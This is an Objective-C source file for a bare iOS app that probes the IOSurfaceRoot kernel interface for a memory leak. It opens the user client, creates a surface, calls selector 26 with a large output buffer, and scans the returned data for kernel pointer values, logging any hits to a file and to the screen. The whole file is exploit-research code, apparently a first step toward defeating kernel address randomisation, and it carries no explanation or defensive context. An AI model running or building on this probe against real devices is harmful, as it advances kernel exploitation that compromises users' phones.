#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <Foundation/Foundation.h>
#import <string.h>
#import <stdlib.h>
static NSMutableString *gLog; static NSString *gPath;
static void L(NSString *fmt,...){va_list ap;va_start(ap,fmt);NSString*s=[[NSString alloc]initWithFormat:fmt arguments:ap];va_end(ap);[gLog appendString:s];[gLog appendString:@"\n"];[gLog writeToFile:gPath atomically:YES encoding:NSUTF8StringEncoding error:nil];NSLog(@"[e26] %@",s);}
static uint64_t rd64(const void*p){uint64_t v;memcpy(&v,p,8);return v;}
static void scan(const char*tag,const uint8_t*b,size_t n){int h=0;for(size_t i=0;i+8<=n;i+=8){uint64_t q=rd64(b+i);if((q&0xfffffff000000000ULL)==0xfffffff000000000ULL){L(@"[HIT %s] +0x%zx=0x%llx",tag,i,(unsigned long long)q);if(++h>8)break;}}}
static void run(void){
 io_service_t svc=IOServiceGetMatchingService(kIOMasterPortDefault,IOServiceMatching("IOSurfaceRoot"));L(@"[svc] 0x%x",svc);if(!svc)return;
 io_connect_t c=0;kern_return_t kr=IOServiceOpen(svc,mach_task_self(),0,&c);IOObjectRelease(svc);L(@"[open] 0x%x",kr);if(kr)return;
 NSString*x=@"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"><plist version=\"1.0\"><dict><key>IOSurfaceWidth</key><integer>64</integer><key>IOSurfaceHeight</key><integer>64</integer><key>IOSurfaceBytesPerElement</key><integer>4</integer><key>IOSurfacePixelFormat</key><integer>1111970369</integer></dict></plist>";
 uint8_t info[0xc68];memset(info,0xAA,sizeof(info));size_t is=sizeof(info);uint64_t si=0;uint64_t so0[2]={0};uint32_t soc0=0;
 kr=IOConnectCallMethod(c,0,&si,1,x.UTF8String,strlen(x.UTF8String)+1,so0,&soc0,info,&is);uint32_t sid=*(uint32_t*)(info+0x18);L(@"[surf] kr=0x%x sid=%u",kr,sid);
 uint8_t in[0x20];memset(in,0,sizeof(in));uint8_t*out=calloc(1,0x100000);size_t os=0x100000;uint64_t so[4]={0};uint32_t soc=4;
 kr=IOConnectCallMethod(c,26,&sid,1,in,0x10,so,&soc,out,&os);L(@"[sel26] kr=0x%x soc=%u so0=0x%llx so1=0x%llx osz=0x%zx",kr,soc,(unsigned long long)so[0],(unsigned long long)so[1],os);
 if(!kr){scan("sel26",out,os<0x1000?os:0x1000);for(int i=0;i<0x40;i+=8)L(@"[out] +0x%x=0x%llx",i,(unsigned long long)rd64(out+i));}
 free(out);IOServiceClose(c);L(@"=== done ===");
}
@interface AppDelegate:UIResponder<UIApplicationDelegate>@property(strong,nonatomic)UIWindow*window;@end
@implementation AppDelegate
- (BOOL)application:(UIApplication*)app didFinishLaunchingWithOptions:(NSDictionary*)opts{
 self.window=[[UIWindow alloc]initWithFrame:[UIScreen mainScreen].bounds];UIViewController*vc=[UIViewController new];vc.view.backgroundColor=UIColor.blackColor;
 UITextView*tv=[[UITextView alloc]initWithFrame:vc.view.bounds];tv.backgroundColor=UIColor.blackColor;tv.textColor=UIColor.greenColor;tv.font=[UIFont monospacedSystemFontOfSize:9 weight:UIFontWeightRegular];tv.editable=NO;tv.text=@"Ent26\n";
 [vc.view addSubview:tv];self.window.rootViewController=vc;[self.window makeKeyAndVisible];[UIApplication sharedApplication].idleTimerDisabled=YES;
 dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH,0),^{NSString*docs=[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES) firstObject];gPath=[docs stringByAppendingPathComponent:@"e26.log"];gLog=[NSMutableString new];run();dispatch_async(dispatch_get_main_queue(),^{tv.text=gLog;});});
 return YES;}
@end
int main(int argc,char**argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,NSStringFromClass([AppDelegate class]));}}
